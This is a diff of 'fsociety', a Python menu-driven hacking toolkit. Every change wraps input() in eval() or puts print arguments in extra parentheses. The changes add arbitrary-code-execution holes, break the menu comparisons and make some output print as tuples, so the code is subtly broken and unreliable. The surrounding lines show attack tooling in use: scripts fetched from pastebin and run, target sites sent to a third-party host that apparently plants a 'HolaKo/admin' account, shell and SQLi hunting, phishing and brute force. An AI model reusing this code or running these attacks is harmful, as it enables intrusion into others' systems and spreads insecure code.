@@ -67,7 +67,7 @@ def clearScr():
 
 
 def yesOrNo():
-    return (input("Continue Y / N: ") in yes)
+    return (eval(input("Continue Y / N: ")) in yes)
 
 
 '''
@@ -159,7 +159,7 @@ class fsociety:
        {11}-CONTRIBUTORS
        {99}-EXIT\n
      '''))
-        choice = input(fsocietyPrompt)
+        choice = eval(input(fsocietyPrompt))
         clearScr()
         if choice == "1":
             informationGatheringMenu()
@@ -215,7 +215,7 @@ class fsociety:
             os.makedirs(logDir)
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
     def update(self):
@@ -242,7 +242,7 @@ class sniffingSpoofingMenu:
             "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
         print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
         print("   {99}-Back To Main Menu \n")
-        choice6 = input(fsocietyPrompt)
+        choice6 = eval(input(fsocietyPrompt))
         clearScr()
         if choice6 == "1":
             setoolkit()
@@ -259,7 +259,7 @@ class sniffingSpoofingMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -288,7 +288,7 @@ class webHackingMenu:
             "   {11}-BruteX - Automatically brute force all services running on a target")
         print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
         print("   {99}-Back To Main Menu \n")
-        choiceweb = input(fsocietyPrompt)
+        choiceweb = eval(input(fsocietyPrompt))
         clearScr()
         if choiceweb == "1":
             maine()
@@ -321,7 +321,7 @@ class webHackingMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -336,12 +336,12 @@ class privateWebHacking:
     def __init__(self):
         clearScr()
         print((self.menuLogo))
-        target = input("Enter Target IP: ")
+        target = eval(input("Enter Target IP: "))
         Fscan(target)
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -360,7 +360,7 @@ class postExploitationMenu:
         print("   {2}--POET")
         print("   {3}--Phishing Framework \n")
         print("   {99}-Return to main menu \n ")
-        choice11 = input(fsocietyPrompt)
+        choice11 = eval(input(fsocietyPrompt))
         clearScr()
         if choice11 == "1":
             sitechecker()
@@ -375,7 +375,7 @@ class postExploitationMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -405,7 +405,7 @@ class informationGatheringMenu:
         print("  {7}--Doork")
         print("  {8}--Crips\n  ")
         print("  {99}-Back To Main Menu \n")
-        choice2 = input(fsocietyPrompt)
+        choice2 = eval(input(fsocietyPrompt))
         clearScr()
         if choice2 == "1":
             nmap()
@@ -430,7 +430,7 @@ class informationGatheringMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -466,7 +466,7 @@ class nmap:
     def run(self):
         clearScr()
         print((self.nmapLogo))
-        target = input(self.targetPrompt)
+        target = eval(input(self.targetPrompt))
         self.menu(target)
 
     def menu(self, target):
@@ -477,19 +477,19 @@ class nmap:
         print("   {2}--Port Scan [-Pn]")
         print("   {3}--Operating System Detection [-A]\n")
         print("   {99}-Return to information gathering menu \n")
-        response = input("nmap ~# ")
+        response = eval(input("nmap ~# "))
         clearScr()
         logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
         try:
             if response == "1":
                 os.system("nmap -sV -oN %s %s" % (logPath, target))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "2":
                 os.system("nmap -Pn -oN %s %s" % (logPath, target))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "3":
                 os.system("nmap -A -oN %s %s" % (logPath, target))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "99":
                 pass
             else:
@@ -509,7 +509,7 @@ class setoolkit:
         else:
             print(alreadyInstalled)
             self.run()
-        response = input(continuePrompt)
+        response = eval(input(continuePrompt))
 
     def installed(self):
         return (os.path.isfile("/usr/bin/setoolkit"))
@@ -536,10 +536,10 @@ class host2ip:
     def __init__(self):
         clearScr()
         print((self.host2ipLogo))
-        host = input("   Enter a Host: ")
+        host = eval(input("   Enter a Host: "))
         ip = socket.gethostbyname(host)
         print(("   %s has the IP of %s" % (host, ip)))
-        response = input(continuePrompt)
+        response = eval(input(continuePrompt))
 
 
 class wpscan:
@@ -558,7 +558,7 @@ class wpscan:
             self.install()
         clearScr()
         print((self.wpscanLogo))
-        target = input("   Enter a Target: ")
+        target = eval(input("   Enter a Target: "))
         self.menu(target)
 
     def installed(self):
@@ -576,7 +576,7 @@ class wpscan:
         print("   {2}--Plugin Enumeration [--enumerate p]")
         print("   {3}--All Enumeration Tools [--enumerate]\n")
         print("   {99}-Return to information gathering menu \n")
-        response = input("wpscan ~# ")
+        response = eval(input("wpscan ~# "))
         clearScr()
         logPath = "../../logs/wpscan-" + \
             strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
@@ -585,15 +585,15 @@ class wpscan:
             if response == "1":
                 os.system(
                     "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "2":
                 os.system(
                     "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "3":
                 os.system(
                     "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
-                response = input(continuePrompt)
+                response = eval(input(continuePrompt))
             elif response == "99":
                 pass
             else:
@@ -618,9 +618,9 @@ class CMSmap:
             self.install()
         clearScr()
         print((self.CMSmapLogo))
-        target = input("   Enter a Target: ")
+        target = eval(input("   Enter a Target: "))
         self.run(target)
-        response = input(continuePrompt)
+        response = eval(input(continuePrompt))
 
     def installed(self):
         return (os.path.isdir(self.installDir))
@@ -656,7 +656,7 @@ class XSStrike:
         clearScr()
         print((self.XSStrikeLogo))
         self.run()
-        response = input(continuePrompt)
+        response = eval(input(continuePrompt))
 
     def installed(self):
         return (os.path.isdir(self.installDir))
@@ -686,9 +686,9 @@ class doork:
             self.install()
         clearScr()
         print((self.doorkLogo))
-        target = input("   Enter a Target: ")
+        target = eval(input("   Enter a Target: "))
         self.run(target)
-        response = input(continuePrompt)
+        response = eval(input(continuePrompt))
 
     def installed(self):
         return (os.path.isdir(self.installDir))
@@ -763,7 +763,7 @@ class passwordAttacksMenu:
         print(
             "   {2}--BruteX - Automatically bruteforces all services running on a target\n")
         print("   {99}-Back To Main Menu \n")
-        choice3 = input("passwd ~# ")
+        choice3 = eval(input("passwd ~# "))
         clearScr()
         if choice3 == "1":
             cupp()
@@ -776,7 +776,7 @@ class passwordAttacksMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -829,7 +829,7 @@ class wirelessTestingMenu:
         print("   {2}--pixiewps")
         print("   {3}--Bluetooth Honeypot GUI Framework \n")
         print("   {99}-Back To The Main Menu \n")
-        choice4 = input(fsocietyPrompt)
+        choice4 = eval(input(fsocietyPrompt))
         clearScr()
         if choice4 == "1":
             reaver()
@@ -844,7 +844,7 @@ class wirelessTestingMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -947,7 +947,7 @@ class exploitationToolsMenu:
         print("   {8}--Bruteforce the Android Passcode given the hash and salt")
         print("   {9}--Joomla SQL injection Scanner \n ")
         print("   {99}-Go Back To Main Menu \n")
-        choice5 = input(fsocietyPrompt)
+        choice5 = eval(input(fsocietyPrompt))
         clearScr()
         if choice5 == "1":
             atscan()
@@ -974,7 +974,7 @@ class exploitationToolsMenu:
         self.completed()
 
     def completed(self):
-        input("Completed, click return to go back")
+        eval(input("Completed, click return to go back"))
         self.__init__()
 
 
@@ -999,7 +999,7 @@ class brutex:
         os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)
 
     def run(self):
-        target = input("Enter Target IP: ")
+        target = eval(input("Enter Target IP: "))
         os.system("brutex %s" % target)
 
 
@@ -1024,7 +1024,7 @@ class arachni:
             "gem install bundler && bundle install --without prof && rake install")
 
     def run(self):
-        target = input("Enter Target Hostname: ")
+        target = eval(input("Enter Target Hostname: "))
         os.system("arachni %s --output-debug 2> %sarachni/%s.log" %
                   (target, logDir, strftime("%Y-%m-%d_%H:%M:%S", gmtime())))
 
@@ -1045,7 +1045,7 @@ def gabriel():
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
-    ftpbypass = input("Enter Target IP and Use Command:")
+    ftpbypass = eval(input("Enter Target IP and Use Command:"))
     os.system("python gabriel.py %s" % ftpbypass)
 
 
@@ -1058,7 +1058,7 @@ def sitechecker():
 def ifinurl():
     print(''' This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.''')
     print('Do You Want To Install InurlBR ? ')
-    cinurl = input("Y/N: ")
+    cinurl = eval(input("Y/N: "))
     if cinurl in yes:
         inurl()
     else:
@@ -1068,7 +1068,7 @@ def ifinurl():
 def bsqlbf():
     clearScr()
     print("This tool will only work on blind sql injection")
-    cbsq = input("select target: ")
+    cbsq = eval(input("select target: "))
     os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
     os.system("perl bsqlbf.pl -url %s" % cbsq)
     os.system("rm bsqlbf.pl")
@@ -1106,13 +1106,13 @@ def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget = input("Select a targets list:")
+    jmtarget = eval(input("Select a targets list:"))
     os.system("python temp.py %s" % jmtarget)
 
 
 def inurl():
-    dork = input("select a Dork:")
-    output = input("select a file to save:")
+    dork = eval(input("select a Dork:"))
+    output = eval(input("select a file to save:"))
     os.system(
         "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
     webHackingMenu.completed("InurlBR")
@@ -1145,8 +1145,8 @@ def jboss():
 
 def wppluginscan():
     Notfound = [404, 401, 400, 403, 406, 301]
-    sitesfile = input("sites file: ")
-    filepath = input("Plugins File: ")
+    sitesfile = eval(input("sites file: "))
+    filepath = eval(input("Plugins File: "))
 
     def scan(site, dir):
         global resp
@@ -1192,7 +1192,7 @@ def grabuploadedlink(url):
             currentcode = urllib.request.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
                 print("-------------------------")
-                print("  [ + ] Found Directory:  " + str(url + dir) + " [ + ]")
+                print(("  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"))
                 print("-------------------------")
                 upload.append(url + dir)
     except:
@@ -1206,8 +1206,8 @@ def grabshell(url):
                 currentcode = urllib.request.urlopen(upl + shell).getcode()
                 if currentcode == 200:
                     print("-------------------------")
-                    print("  [ ! ] Found Shell:  " + \
-                        str(upl + shell) + " [ ! ]")
+                    print(("  [ ! ] Found Shell:  " + \
+                        str(upl + shell) + " [ ! ]"))
                     print("-------------------------")
     except:
         pass
@@ -1215,7 +1215,7 @@ def grabshell(url):
 
 def shelltarget():
     print("Exemple: http://target.com")
-    line = input("target: ")
+    line = eval(input("target: "))
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
@@ -1290,7 +1290,7 @@ def check_gravityforms(sites):
 
 
 def gravity():
-    ip = input('Enter IP: ')
+    ip = eval(input('Enter IP: '))
     sites = bing_all_grabber(str(ip))
     gravityforms = check_gravityforms(sites)
     for ss in gravityforms:
@@ -1311,8 +1311,8 @@ def shellnoob():
 
 
 def androidhash():
-    key = input("Enter the android hash: ")
-    salt = input("Enter the android salt: ")
+    key = eval(input("Enter the android hash: "))
+    salt = eval(input("Enter the android salt: "))
     os.system(
         "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
     os.system(
@@ -1321,7 +1321,7 @@ def androidhash():
 
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
-    target = input("Select a target: ")
+    target = eval(input("Select a target: "))
     os.system(
         "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
     os.system("python cms.py %s" % target)
@@ -1372,7 +1372,7 @@ class Fscan:
         self.getSites(False)
         print(menuu)
         while True:
-            choice = input(fsocietyPrompt)
+            choice = eval(input(fsocietyPrompt))
             if choice == '1':
                 self.getSites(True)
             elif choice == '2':
@@ -1390,7 +1390,7 @@ class Fscan:
             elif choice == '8':
                 self.grabSqli()
             elif choice == '9':
-                ran = input(' Enter range of ports, (ex: 1-1000) -> ')
+                ran = eval(input(' Enter range of ports, (ex: 1-1000) -> '))
                 self.portScanner(1, ran)
             elif choice == '10':
                 self.portScanner(2, None)
@@ -1400,7 +1400,7 @@ class Fscan:
                 self.cloudflareBypasser()
             elif choice == '99':
                 fsociety()
-            con = input(' Continue [Y/n] -> ')
+            con = eval(input(' Continue [Y/n] -> '))
             if con[0].upper() == 'N':
                 exit()
             else:
@@ -1511,7 +1511,7 @@ class Fscan:
             for admin in adminList:
                 try:
                     if urllib.request.urlopen(site + admin).getcode() == 200:
-                        print(" [*] Found admin panel -> ", site + admin)
+                        print((" [*] Found admin panel -> ", site + admin))
                 except IOError:
                     pass
  ############################
@@ -1530,7 +1530,7 @@ class Fscan:
             for zip1 in zipList:
                 try:
                     if urllib.request.urlopen(site + zip1).getcode() == 200:
-                        print(" [*] Found zip file -> ", site + zip1)
+                        print((" [*] Found zip file -> ", site + zip1))
                 except IOError:
                     pass
 
@@ -1551,7 +1551,7 @@ class Fscan:
                         html = urllib.request.urlopen(site + up).readlines()
                         for line in html:
                             if re.findall('type=file', line):
-                                print(" [*] Found upload -> ", site + up)
+                                print((" [*] Found upload -> ", site + up))
                 except IOError:
                     pass
 
@@ -1579,7 +1579,7 @@ class Fscan:
                     resp = urllib.request.urlopen(
                         site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                     if 'invalid username' not in resp.lower():
-                        print('\t [*] Found -> ', site)
+                        print(('\t [*] Found -> ', site))
                         userslist.append(site)
                         break
                     else:
@@ -1611,11 +1611,11 @@ class Fscan:
                 pass
             for sub in subdoms:
                 doo = sub + '.' + site
-                print(' [~] Trying -> ', doo)
+                print((' [~] Trying -> ', doo))
                 try:
                     ddd = socket.gethostbyname(doo)
                     if ddd != ip:
-                        print(' [*] Cloudflare bypassed -> ', ddd)
+                        print((' [*] Cloudflare bypassed -> ', ddd))
                         break
                 except socket.error:
                     pass
@@ -1630,8 +1630,8 @@ class Fscan:
         try:
             s = 'http://' + self.serverip
             httpresponse = urllib.request.urlopen(s)
-            print(' [*] Server header -> ', httpresponse.headers.getheader(
-                'server'))
+            print((' [*] Server header -> ', httpresponse.headers.getheader(
+                'server')))
         except:
             print('[*] Server header ->  Not Found')
 
@@ -1682,7 +1682,7 @@ class Fscan:
                         for line in html:
                             checker = re.findall(check, line)
                             if len(checker) != 0:
-                                print(' [*] SQLi found -> ', power)
+                                print((' [*] SQLi found -> ', power))
             except:
                 pass
 
@@ -1711,7 +1711,7 @@ def do_it(ip, port):
 
     sock = sock.connect_ex((ip, port))
     if sock == 0:
-        print(" [*] Port %i is open" % port)
+        print((" [*] Port %i is open" % port))
 
 
 ############################
@@ -1725,7 +1725,7 @@ minu = '''
 
 def drupal():
     '''Drupal Exploit Binger All Websites Of server '''
-    ip = input('1- IP: ')
+    ip = eval(input('1- IP: '))
     page = 1
     while page <= 50:
 
@@ -1744,12 +1744,12 @@ def drupal():
                 urlpa = urlparse(url)
                 site = urlpa.netloc
 
-                print("[+] Testing At " + site)
+                print(("[+] Testing At " + site))
                 resp = urllib.request.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User: HolaKo" in read:
-                    print("Exploit found =>" + site)
+                    print(("Exploit found =>" + site))
 
                     print("user:HolaKo\npass:admin")
                     a = open('up.txt', 'a')
@@ -1766,7 +1766,7 @@ def drupal():
 
 
 def getdrupal():
-    ip = input('Enter The Ip:  ')
+    ip = eval(input('Enter The Ip:  '))
     page = 1
     sites = list()
     while page <= 50:
@@ -1790,7 +1790,7 @@ def getdrupal():
 
 
 def drupallist():
-    listop = input("Enter The list Txt: ")
+    listop = eval(input("Enter The list Txt: "))
     fileopen = open(listop, 'r')
     content = fileopen.readlines()
     for i in content:
@@ -1800,14 +1800,14 @@ def drupallist():
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
-                print("[+]Success =>" + url)
+                print(("[+]Success =>" + url))
                 print("[-]username:HolaKo\n[-]password:admin")
                 save = open('drupal.txt', 'a')
                 save.write(
                     url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
 
             else:
-                print(i + "=> exploit not found ")
+                print((i + "=> exploit not found "))
         except Exception as ex:
             print(ex)
 
@@ -1815,7 +1815,7 @@ def drupallist():
 def maine():
 
     print(minu)
-    choose = input("choose a number: ")
+    choose = eval(input("choose a number: "))
     while True:
 
         if choose == "1":
@@ -1891,18 +1891,18 @@ def check_joomla(sites):
 
 def wppjmla():
 
-    ipp = input('Enter Target IP: ')
+    ipp = eval(input('Enter Target IP: '))
     sites = bing_all_grabber(str(ipp))
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
     for ss in wordpress:
         print(ss)
-    print('[+] Found ! ', len(wordpress), ' Wordpress Websites')
-    print('-' * 30 + '\n')
+    print(('[+] Found ! ', len(wordpress), ' Wordpress Websites'))
+    print(('-' * 30 + '\n'))
     for ss in joomla:
         print(ss)
 
-    print('[+] Found ! ', len(joomla), ' Joomla Websites')
+    print(('[+] Found ! ', len(joomla), ' Joomla Websites'))
 
     print('\n')
 # initialise the fscan function
@@ -1912,7 +1912,7 @@ def wppjmla():
 
 def grabsqli(ip):
     try:
-        print(color.OKBLUE + "Check_Uplaod... ")
+        print((color.OKBLUE + "Check_Uplaod... "))
         print('\n')
 
         page = 1
@@ -1943,7 +1943,7 @@ def checksqli(sqli):
 
 
 def sqlscan():
-    ip = input('Enter IP -> ')
+    ip = eval(input('Enter IP -> '))
     grabsqli(ip)
 
 
@@ -2053,7 +2053,7 @@ def check_wpsymposium(sites):
 
 
 def wpminiscanner():
-    ip = input('Enter IP: ')
+    ip = eval(input('Enter IP: '))
     sites = bing_all_grabber(str(ip))
     wordpress = check_wordpress(sites)
     wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
@@ -2063,29 +2063,29 @@ def wpminiscanner():
     wpsymposium = check_wpsymposium(sites)
     for ss in wordpress:
         print(ss)
-    print('[*] Found, ', len(wordpress), ' wordpress sites.')
-    print('-' * 30 + '\n')
+    print(('[*] Found, ', len(wordpress), ' wordpress sites.'))
+    print(('-' * 30 + '\n'))
     for ss in wpstorethemeremotefileupload:
         print(ss)
-    print('[*] Found, ', len(
-        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.')
-    print('-' * 30 + '\n')
+    print(('[*] Found, ', len(
+        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'))
+    print(('-' * 30 + '\n'))
     for ss in wpcontactcreativeform:
         print(ss)
-    print('[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.')
-    print('-' * 30 + '\n')
+    print(('[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'))
+    print(('-' * 30 + '\n'))
     for ss in wplazyseoplugin:
         print(ss)
-    print('[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
-    print('-' * 30 + '\n')
+    print(('[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'))
+    print(('-' * 30 + '\n'))
     for ss in wpeasyupload:
         print(ss)
-    print('[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.')
-    print('-' * 30 + '\n')
+    print(('[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'))
+    print(('-' * 30 + '\n'))
     for ss in wpsymposium:
         print(ss)
 
-    print('[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.')
+    print(('[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'))
 
     print('\n')
 ############################
